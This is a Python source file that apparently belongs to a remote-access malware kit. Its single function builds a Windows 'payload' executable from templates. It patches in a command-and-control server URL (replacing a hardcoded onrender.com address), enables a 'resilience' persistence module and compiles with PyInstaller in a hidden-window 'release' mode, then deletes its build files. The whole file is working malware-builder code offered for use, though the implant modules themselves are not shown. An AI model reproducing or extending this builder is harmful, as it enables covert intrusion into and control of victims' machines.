import os
import subprocess
import shutil

def build_payload(payload_name: str, c2_url: str, resilience_enabled: bool, output_dir: str = ".", debug_mode: bool = False):
    """
    Dynamically creates and builds a payload executable using PyInstaller.
    """
    # Calculate absolute paths to ensure the script finds the correct folders
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
    PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
    TEMPLATE_DIR = os.path.join(PROJECT_ROOT, "payload_template")

    print(f"[*] Starting payload build...")
    print(f"    - Name: {payload_name}.exe")
    print(f"    - Resilience: {'Enabled' if resilience_enabled else 'Disabled'}")
    print(f"    - Mode: {'DEBUG (Console Visible)' if debug_mode else 'RELEASE (Hidden Window)'}")

    build_dir = os.path.join(output_dir, "build_temp")
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)

    try:
        print(f"[*] Copying payload templates from: {TEMPLATE_DIR}")
        if not os.path.exists(TEMPLATE_DIR):
            print(f"[!] CRITICAL ERROR: The template directory does not exist at '{TEMPLATE_DIR}'")
            return False

        for filename in os.listdir(TEMPLATE_DIR):
            if os.path.isfile(os.path.join(TEMPLATE_DIR, filename)):
                 shutil.copy(os.path.join(TEMPLATE_DIR, filename), build_dir)

        print("[*] Configuring payload settings...")
        comms_path = os.path.join(build_dir, "comms.py")
        with open(comms_path, "r") as f: content = f.read()
        content = content.replace('https://tether-c2-communication-line-by-ebowluh.onrender.com', c2_url)
        with open(comms_path, "w") as f: f.write(content)

        payload_path = os.path.join(build_dir, "payload.py")
        with open(payload_path, "r") as f: content = f.read()
        content = content.replace('ENABLE_RESILIENCE = True', f'ENABLE_RESILIENCE = {resilience_enabled}')
        with open(payload_path, "w") as f: f.write(content)

        resilience_path = os.path.join(build_dir, "resilience.py")
        with open(resilience_path, "r") as f: content = f.read()
        content = content.replace('payload_main.exe', f'{payload_name}.exe')
        with open(resilience_path, "w") as f: f.write(content)

        print("[*] Running PyInstaller. This may take a moment...")
        pyinstaller_cmd = ['pyinstaller', '--noconfirm', '--onefile', '--distpath', output_dir, '--name', payload_name]
        if not debug_mode:
            pyinstaller_cmd.append('--windowed')
        pyinstaller_cmd.append(os.path.join(build_dir, 'payload.py'))
        subprocess.run(pyinstaller_cmd, check=True, capture_output=True, text=True)

        print(f"\n[+] Build successful!")
        print(f"    - Payload saved as: {os.path.join(output_dir, payload_name)}.exe")
        return True

    except subprocess.CalledProcessError as e:
        print("\n[!] BUILD FAILED. PyInstaller encountered an error.")
        print("-" * 50); print(e.stdout); print(e.stderr); print("-" * 50)
        return False
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")
        return False
    finally:
        print("[*] Cleaning up temporary build files...")
        if os.path.exists(build_dir): shutil.rmtree(build_dir)
        spec_file = f"{payload_name}.spec"
        spec_path = os.path.join(SCRIPT_DIR, spec_file)
        if os.path.exists(spec_path): os.remove(spec_path)
        spec_path_root = os.path.join(PROJECT_ROOT, spec_file)
        if os.path.exists(spec_path_root): os.remove(spec_path_root)